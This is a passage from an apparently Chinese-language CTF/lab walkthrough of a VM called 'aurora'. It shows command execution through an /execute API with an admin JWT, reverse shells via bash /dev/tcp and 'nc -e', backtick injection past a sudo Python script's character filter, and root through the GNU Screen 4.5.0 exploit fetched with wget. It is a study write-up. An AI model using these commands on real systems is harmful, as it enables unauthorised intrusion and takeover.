 :: Method           <span class="token builtin class-name">:</span> POST
 :: URL              <span class="token builtin class-name">:</span> http://192.168.56.175:3000/execute
 :: Wordlist         <span class="token builtin class-name">:</span> FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Header           <span class="token builtin class-name">:</span> Content-Type: application/json
 :: Header           <span class="token builtin class-name">:</span> Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzEzNzkzMDc0fQ._RwKQ_EntJ-JfKBf1XFz01kuo2urBrlfPcmwlRL7Q_I
 :: Data             <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span><span class="token string">"FUZZ"</span><span class="token builtin class-name">:</span><span class="token string">"123"</span><span class="token punctuation">&#125;</span>
 :: Follow redirects <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Calibration      <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Timeout          <span class="token builtin class-name">:</span> <span class="token number">10</span>
 :: Threads          <span class="token builtin class-name">:</span> <span class="token number">40</span>
 :: Matcher          <span class="token builtin class-name">:</span> Response status: <span class="token number">200</span>-299,301,302,307,401,403,405,500
 :: Filter           <span class="token builtin class-name">:</span> Response words: <span class="token number">54</span>
________________________________________________

<span class="token builtin class-name">command</span>                 <span class="token punctuation">[</span>Status: <span class="token number">500</span>, Size: <span class="token number">14</span>, Words: <span class="token number">2</span>, Lines: <span class="token number">1</span>, Duration: 34ms<span class="token punctuation">]</span>
:: Progress: <span class="token punctuation">[</span><span class="token number">26584</span>/26584<span class="token punctuation">]</span> :: Job <span class="token punctuation">[</span><span class="token number">1</span>/1<span class="token punctuation">]</span> :: <span class="token number">2500</span> req/sec :: Duration: <span class="token punctuation">[</span><span class="token number">0</span>:00:10<span class="token punctuation">]</span> :: Errors: <span class="token number">0</span> ::</code></pre>
<p>参数是command，看看执行情况</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># curl http://192.168.56.175:3000/execute -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzEzNzkzMDc0fQ._RwKQ_EntJ-JfKBf1XFz01kuo2urBrlfPcmwlRL7Q_I" -d '&#123;"command":"id"&#125;'</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span></code></pre>
<p>那么就能拿shell了</p>
<h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><p>用nc可以反弹shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># curl http://192.168.56.175:3000/execute -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzEzNzkzMDc0fQ._RwKQ_EntJ-JfKBf1XFz01kuo2urBrlfPcmwlRL7Q_I" -d '&#123;"command":"bash -c 'bash -i >&amp; /dev/tcp/192.168.56.104/4567  0>&amp;1'"&#125;'</span>
zsh: no such <span class="token function">file</span> or directory: /dev/tcp/192.168.56.104/4567
                                                                                                                                                
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># curl http://192.168.56.175:3000/execute -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzEzNzkzMDc0fQ._RwKQ_EntJ-JfKBf1XFz01kuo2urBrlfPcmwlRL7Q_I" -d '&#123;"command":"nc -e /bin/bash 192.168.56.104 4567"&#125;'</span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@aurora:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> /home 
total <span class="token number">12</span>
drwxr-xr-x  <span class="token number">3</span> root root <span class="token number">4096</span> Mar  <span class="token number">6</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">18</span> root root <span class="token number">4096</span> Feb  <span class="token number">6</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
drwxr-xr-x  <span class="token number">4</span> doro doro <span class="token number">4096</span> Mar  <span class="token number">8</span>  <span class="token number">2023</span> doro
www-data@aurora:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> www-data on aurora:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin

User www-data may run the following commands on aurora:
    <span class="token punctuation">(</span>doro<span class="token punctuation">)</span> NOPASSWD: /usr/bin/python3 /home/doro/tools.py *</code></pre>
<p>home下只有一个doro，并且正好可以sudo提权,先看一下这个python脚本</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@aurora:/home/doro$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>       
total <span class="token number">36</span>
drwxr-xr-x <span class="token number">4</span> doro doro <span class="token number">4096</span> Mar  <span class="token number">8</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">3</span> root root <span class="token number">4096</span> Mar  <span class="token number">6</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
lrwxrwxrwx <span class="token number">1</span> root root    <span class="token number">9</span> Mar  <span class="token number">3</span>  <span class="token number">2023</span> .bash_history -<span class="token operator">></span> /dev/null
-rw-r--r-- <span class="token number">1</span> doro doro  <span class="token number">220</span> Mar  <span class="token number">3</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> doro doro <span class="token number">3526</span> Mar  <span class="token number">3</span>  <span class="token number">2023</span> .bashrc
drwxr-xr-x <span class="token number">3</span> doro doro <span class="token number">4096</span> Mar  <span class="token number">4</span>  <span class="token number">2023</span> .local
-rw-r--r-- <span class="token number">1</span> doro doro  <span class="token number">807</span> Mar  <span class="token number">3</span>  <span class="token number">2023</span> .profile
drwx------ <span class="token number">2</span> doro doro <span class="token number">4096</span> Mar  <span class="token number">4</span>  <span class="token number">2023</span> .ssh
-rw-r--r-- <span class="token number">1</span> root root <span class="token number">1380</span> Mar  <span class="token number">7</span>  <span class="token number">2023</span> tools.py
-rwx------ <span class="token number">1</span> doro doro   <span class="token number">33</span> Mar  <span class="token number">3</span>  <span class="token number">2023</span> user.txt
</code></pre>
<p>只有读的权限，那不能重写一个了，先审计一下，看看能不能用功能提权，如果不能，再看能不能修改库提权</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> sys

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
        print_help<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    
    option <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> option <span class="token operator">==</span> <span class="token string">"--ping"</span><span class="token punctuation">:</span>
        ping<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> option <span class="token operator">==</span> <span class="token string">"--traceroute"</span><span class="token punctuation">:</span>
        traceroute_ip<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Invalid option."</span><span class="token punctuation">)</span>
        print_help<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">print_help</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Usage: python3 network_tool.py &lt;option>"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Options:"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"--ping           Ping an IP address"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"--traceroute     Perform a traceroute on an IP address"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">ping</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ip_address <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Enter an IP address: "</span><span class="token punctuation">)</span>

    forbidden_chars <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"&amp;"</span><span class="token punctuation">,</span> <span class="token string">";"</span><span class="token punctuation">,</span> <span class="token string">"("</span><span class="token punctuation">,</span> <span class="token string">")"</span><span class="token punctuation">,</span> <span class="token string">"||"</span><span class="token punctuation">,</span> <span class="token string">"|"</span><span class="token punctuation">,</span> <span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">"&lt;"</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">,</span> <span class="token string">"?"</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> char <span class="token keyword">in</span> forbidden_chars<span class="token punctuation">:</span>
        <span class="token keyword">if</span> char <span class="token keyword">in</span> ip_address<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Forbidden character found: &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span>
            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ping -c 2 '</span> <span class="token operator">+</span> ip_address<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">traceroute_ip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ip_address <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Enter an IP address: "</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token keyword">not</span> is_valid_ip<span class="token punctuation">(</span>ip_address<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Invalid IP address."</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    
    traceroute_command <span class="token operator">=</span> <span class="token string">"traceroute &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip_address<span class="token punctuation">)</span>
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>traceroute_command<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">is_valid_ip</span><span class="token punctuation">(</span>ip_address<span class="token punctuation">)</span><span class="token punctuation">:</span>
    octets <span class="token operator">=</span> ip_address<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>octets<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">for</span> octet <span class="token keyword">in</span> octets<span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> octet<span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">int</span><span class="token punctuation">(</span>octet<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token keyword">or</span> <span class="token builtin">int</span><span class="token punctuation">(</span>octet<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">255</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">return</span> <span class="token boolean">True</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>–ping可以执行ping指令，让我想到了CTF的命令执行，看看能不能绕过一下</p>
<pre class="language-none"><code class="language-none">forbidden_chars &#x3D; [&quot;&amp;&quot;, &quot;;&quot;, &quot;(&quot;, &quot;)&quot;, &quot;||&quot;, &quot;|&quot;, &quot;&gt;&quot;, &quot;&lt;&quot;, &quot;*&quot;, &quot;?&quot;]</code></pre>
<p>过滤了这些字符，测试发现反引号可以直接用</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>-u doro /usr/bin/python3 /home/doro/tools.py <span class="token parameter variable">--ping</span>
Enter an IP address: <span class="token variable"><span class="token variable">`</span><span class="token function">ls</span><span class="token variable">`</span></span>
ping: user.txt: Temporary failure <span class="token keyword">in</span> name resolution</code></pre>
<p>依然用nc弹个shell回来</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>-u doro /usr/bin/python3 /home/doro/tools.py <span class="token parameter variable">--ping</span>
Enter an IP address: <span class="token variable"><span class="token variable">`</span><span class="token function">nc</span> <span class="token parameter variable">-e</span> /bin/bash <span class="token number">192.168</span>.56.104 <span class="token number">4567</span><span class="token variable">`</span></span></code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nc -lnvp 4567         </span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.56.104<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.56.175<span class="token punctuation">]</span> <span class="token number">33762</span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>doro<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>doro<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>doro<span class="token punctuation">)</span></code></pre>
<p>也是拿到了user flag了真不容易</p>
<h1 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h1><p><strong>SUID</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">doro@aurora:~$ <span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/mount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/screen
/usr/bin/sudo
/usr/bin/umount</code></pre>
<p>嘶,好眼熟的screen,我死去的记忆突然向我袭来，我下意识打开我以前的CSDN博客，重重的输入screen<br>果然，之前做的DC-5用的就是screen提权<br><a href="https://blog.csdn.net/qq_34942239/article/details/135864183?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171603586216800184169039%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=171603586216800184169039&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~times_rank-2-135864183-null-null.nonecase&utm_term=screen&spm=1018.2226.3001.4450">https://blog.csdn.net/qq_34942239/article/details/135864183?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171603586216800184169039%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=171603586216800184169039&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~times_rank-2-135864183-null-null.nonecase&amp;utm_term=screen&amp;spm=1018.2226.3001.4450</a><br>直接上手</p>
<ol>
<li>searchsploit搜<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># searchsploit screen                              </span>

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                         <span class="token operator">|</span>  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Advanced Desktop Locker <span class="token number">6.0</span>.0 - Lock Screen Bypass                                                                                                                                                     <span class="token operator">|</span> windows/local/40995.txt
Amateur Photographer<span class="token string">'s Image Gallery - '</span>fullscreen.php?albumid<span class="token string">' SQL Injection                                                                                                                          | php/webapps/37963.txt
Apple iOS 7.0.2 - Sim Lock Screen Display Bypass                                                                                                                                                       | ios/webapps/28978.txt
Apple Safari - GdiDrawStream Blue Screen of Death                                                                                                                                                      | windows_x86-64/dos/18275.txt
Aqua Real Screensaver - '</span>.ar<span class="token string">' Buffer Overflow                                                                                                                                                          | windows/dos/34094.pl
Aruba MC-800 Mobility Controller - Screens Directory HTML Injection                                                                                                                                    | multiple/remote/30771.txt
ClipShare Pro 4.0 - '</span>fullscreen.php<span class="token string">' Cross-Site Scripting                                                                                                                                              | php/webapps/32526.txt
CommView 6.1 (Build 636) - Local Blue Screen of Death (Denial of Service)                                                                                                                              | windows/dos/12356.c
Compro Technology IP Camera - '</span> mjpegStreamer.cgi<span class="token string">' Screenshot Disclosure                                                                                                                               | hardware/webapps/50254.txt
Crush FTP 5 - '</span>APPE<span class="token string">' Remote JVM Blue Screen of Death (PoC)                                                                                                                                             | windows/dos/17795.py
ELS Screen to Screen 1.0 - Multiple Password Vulnerabilities                                                                                                                                           | osx/local/19437.txt
Faleemi Desktop Software 1.8.2 - '</span>SavePath <span class="token keyword">for</span> ScreenShots<span class="token string">' Buffer Overflow (SEH)                                                                                                                      | windows/local/45402.py
GNU Screen 3.9.x Braille Module - Local Buffer Overflow                                                                                                                                                | unix/local/21414.c
GNU Screen 4.5.0 - Local Privilege Escalation                                                                                                                                                          | linux/local/41154.sh
GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                                                                                                                                                    | linux/local/41152.txt
GNU screen v4.9.0 - Privilege Escalation                                                                                                                                                               | linux/local/51252.py
iSmartViewPro 1.5 - '</span>SavePath <span class="token keyword">for</span> ScreenShots<span class="token string">' Local Buffer Overflow (SEH)                                                                                                                             | windows_x86/local/45349.py
Juergen Weigert screen 3.9 - User Supplied Format String                                                                                                                                               | bsd/local/20191.c
Juniper NetScreen 5.0 - VPN '</span>Username<span class="token string">' Enumeration                                                                                                                                                     | hardware/remote/26168.txt
League of Legends Screensaver - Insecure File Permissions Privilege Escalation                                                                                                                         | windows/local/39903.txt
League of Legends Screensaver - Unquoted Service Path Privilege Escalation                                                                                                                             | windows/local/39902.txt
LG G4 - Touchscreen Driver write_log Kernel Read/Write                                                                                                                                                 | android/dos/41353.txt
Microsoft Internet Explorer - JavaScript screen[ ] Denial of Service                                                                                                                                   | windows/dos/7710.html
Microsoft Windows NT 4.0/SP1/SP2/SP3/SP4 / NT 3.5.1/SP1/SP2/SP3/SP4/SP5 - Screensaver                                                                                                                  | windows/local/19359.txt
Microsoft Windows Server 2003 - '</span>.EOT<span class="token string">' Blue Screen of Death Crash                                                                                                                                      | windows/dos/9417.txt
Microsoft Windows Vista - Access Violation from Limited Account (Blue Screen of Death)                                                                                                                 | windows/dos/6671.c
Microsoft Windows Vista/7 - SMB2.0 Negotiate Protocol Request Remote Blue Screen of Death (MS07-063)                                                                                                   | windows/dos/9594.txt
Microsoft Winows 7 - Keyboard Layout Blue Screen of Death (MS10-073)                                                                                                                                   | windows/dos/18140.c
Monitoring software iSmartViewPro 1.5 - '</span>SavePath <span class="token keyword">for</span> ScreenShots<span class="token string">' Buffer Overflow                                                                                                                     | windows_x86/local/45181.py
NetScreen ScreenOS 4.0.1/4.0.3 - TCP Window Size Remote Denial of Service                                                                                                                              | windows/dos/22970.txt
PeerBlock 1.1 - Blue Screen of Death                                                                                                                                                                   | windows/dos/18475.txt
Screen 4.0.3 (OpenBSD) - Local Authentication Bypass                                                                                                                                                   | linux/local/4028.txt
Screen SFT DAB 600/C - Authentication Bypass Account Creation                                                                                                                                          | hardware/remote/51455.py
Screen SFT DAB 600/C - Authentication Bypass Admin Password Change                                                                                                                                     | hardware/remote/51458.py
Screen SFT DAB 600/C - Authentication Bypass Erase Account                                                                                                                                             | hardware/remote/51457.py
Screen SFT DAB 600/C - Authentication Bypass Password Change                                                                                                                                           | hardware/remote/51456.py
Screen SFT DAB 600/C - Authentication Bypass Reset Board Config                                                                                                                                        | hardware/remote/51459.py
Screen SFT DAB 600/C - Unauthenticated Information Disclosure (userManager.cgx)                                                                                                                        | hardware/remote/51460.txt
ScreenOS 1.73/2.x - Firewall Denial of Service                                                                                                                                                         | sco/dos/20532.txt
ScreenStream 3.0.15 - Denial of Service                                                                                                                                                                | android/dos/46443.py
Solaris 11.4 - xscreensaver Privilege Escalation                                                                                                                                                       | solaris/local/47529.txt
Solaris xscreensaver 11.4 - Privilege Escalation                                                                                                                                                       | solaris/local/47509.txt
Sun Microsystems SunScreen Firewall - Privilege Escalation                                                                                                                                             | multiple/remote/16041.txt
XBMC 8.10 - '</span>takescreenshot' Remote Buffer Overflow                                                                                                                                                    <span class="token operator">|</span> windows/remote/8339.py
xscreensaver <span class="token number">5.01</span> - Arbitrary File Disclosure Symlink                                                                                                                                                  <span class="token operator">|</span> multiple/local/9097.txt
Yasr Screen Reader <span class="token number">0.6</span>.9 - Local Buffer Overflow                                                                                                                                                       <span class="token operator">|</span> linux/local/39734.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcode Title                                                                                                                                                                                       <span class="token operator">|</span>  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Windows/x64 <span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> - Screen Lock Shellcode <span class="token punctuation">(</span><span class="token number">9</span> bytes<span class="token punctuation">)</span>                                                                                                                                                      <span class="token operator">|</span> windows_x86-64/47953.c
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Papers: No Results</code></pre>
获取下来<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># searchsploit -m 41154.sh</span>

  Exploit: GNU Screen <span class="token number">4.5</span>.0 - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/41154
     Path: /usr/share/exploitdb/exploits/linux/local/41154.sh
    Codes: N/A
 Verified: True
File Type: Bourne-Again shell script, ASCII text executable
Copied to: /root/Desktop/41154.sh</code></pre>
直接将这个sh传到kali上玩得了<pre class="language-bash" data-language="bash"><code class="language-bash">doro@aurora:~$ <span class="token function">wget</span> http://192.168.56.104:6677/41154.sh
--2024-05-18 <span class="token number">14</span>:50:18--  http://192.168.56.104:6677/41154.sh
Connecting to <span class="token number">192.168</span>.56.104:6677<span class="token punctuation">..</span>. connected.
HTTP request sent, awaiting response<span class="token punctuation">..</span>. <span class="token number">200</span> OK
Length: <span class="token number">1149</span> <span class="token punctuation">(</span><span class="token number">1</span>.1K<span class="token punctuation">)</span> <span class="token punctuation">[</span>text/x-sh<span class="token punctuation">]</span>
Saving to: ‘41154.sh’

<span class="token number">41154</span>.sh            <span class="token number">100</span>%<span class="token punctuation">[</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">]</span>   <span class="token number">1</span>.12K  --.-KB/s    <span class="token keyword">in</span> 0s      

<span class="token number">2024</span>-05-18 <span class="token number">14</span>:50:18 <span class="token punctuation">(</span><span class="token number">506</span> MB/s<span class="token punctuation">)</span> - ‘41154.sh’ saved <span class="token punctuation">[</span><span class="token number">1149</span>/1149<span class="token punctuation">]</span>

doro@aurora:~$ <span class="token function">bash</span> <span class="token number">41154</span>.sh
~ gnu/screenroot ~
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> First, we create our shell and library<span class="token punctuation">..</span>.
/tmp/libhax.c: In <span class="token keyword">function</span> ‘dropshell’:
/tmp/libhax.c:7:5: warning: implicit declaration of <span class="token keyword">function</span> ‘chmod’ <span class="token punctuation">[</span>-Wimplicit-function-declaration<span class="token punctuation">]</span>
    <span class="token number">7</span> <span class="token operator">|</span>     chmod<span class="token punctuation">(</span><span class="token string">"/tmp/rootshell"</span>, 04755<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token operator">|</span>     ^~~~~
/tmp/rootshell.c: In <span class="token keyword">function</span> ‘main’:
/tmp/rootshell.c:3:5: warning: implicit declaration of <span class="token keyword">function</span> ‘setuid’ <span class="token punctuation">[</span>-Wimplicit-function-declaration<span class="token punctuation">]</span>
    <span class="token number">3</span> <span class="token operator">|</span>     setuid<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token operator">|</span>     ^~~~~~
/tmp/rootshell.c:4:5: warning: implicit declaration of <span class="token keyword">function</span> ‘setgid’ <span class="token punctuation">[</span>-Wimplicit-function-declaration<span class="token punctuation">]</span>
    <span class="token number">4</span> <span class="token operator">|</span>     setgid<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token operator">|</span>     ^~~~~~
/tmp/rootshell.c:5:5: warning: implicit declaration of <span class="token keyword">function</span> ‘seteuid’ <span class="token punctuation">[</span>-Wimplicit-function-declaration<span class="token punctuation">]</span>
    <span class="token number">5</span> <span class="token operator">|</span>     seteuid<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token operator">|</span>     ^~~~~~~
/tmp/rootshell.c:6:5: warning: implicit declaration of <span class="token keyword">function</span> ‘setegid’ <span class="token punctuation">[</span>-Wimplicit-function-declaration<span class="token punctuation">]</span>
    <span class="token number">6</span> <span class="token operator">|</span>     setegid<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token operator">|</span>     ^~~~~~~
/tmp/rootshell.c:7:5: warning: implicit declaration of <span class="token keyword">function</span> ‘execvp’ <span class="token punctuation">[</span>-Wimplicit-function-declaration<span class="token punctuation">]</span>
    <span class="token number">7</span> <span class="token operator">|</span>     execvp<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span>, NULL, NULL<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token operator">|</span>     ^~~~~~
/tmp/rootshell.c:7:5: warning: too many arguments to built-in <span class="token keyword">function</span> ‘execvp’ expecting <span class="token number">2</span> <span class="token punctuation">[</span>-Wbuiltin-declaration-mismatch<span class="token punctuation">]</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Now we create our /etc/ld.so.preload file<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Triggering<span class="token punctuation">..</span>.
' from /etc/ld.so.preload cannot be preloaded <span class="token punctuation">(</span>cannot <span class="token function">open</span> shared object <span class="token function">file</span><span class="token punctuation">)</span>: ignored.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> done<span class="token operator">!</span>
No Sockets found <span class="token keyword">in</span> /tmp/screens/S-doro.

<span class="token comment"># id</span>
